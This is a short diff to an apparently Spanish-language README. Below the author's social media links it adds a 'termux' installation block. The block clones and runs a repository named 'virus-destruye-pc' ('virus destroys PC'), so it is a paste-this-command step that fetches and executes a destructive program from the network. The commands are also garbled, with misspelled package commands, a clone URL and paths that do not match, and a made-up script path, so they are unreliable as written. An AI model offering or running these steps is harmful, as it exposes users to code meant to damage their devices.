@@ -79,3 +79,20 @@ __Recursos utilizados:__
 - [Facebook](https://www.facebook.com/SebastianEPH)
 - [Linkedin](https://www.linkedin.com/in/sebastianeph/)
 - [Telegram](https://t.me/sebastianeph)
+
+
+termux intalacion prueva
+
+
+pkg intall update
+
+pkg intall git
+
+git clone https://github.com/solo-22/virus-destruye-pc/tree/main
+
+cd virus-destruye-pc/tree/main
+ls
+
+bash virus-destruye-pc/tree/main.sh
+
+./virus-destruye-pc/tree/main
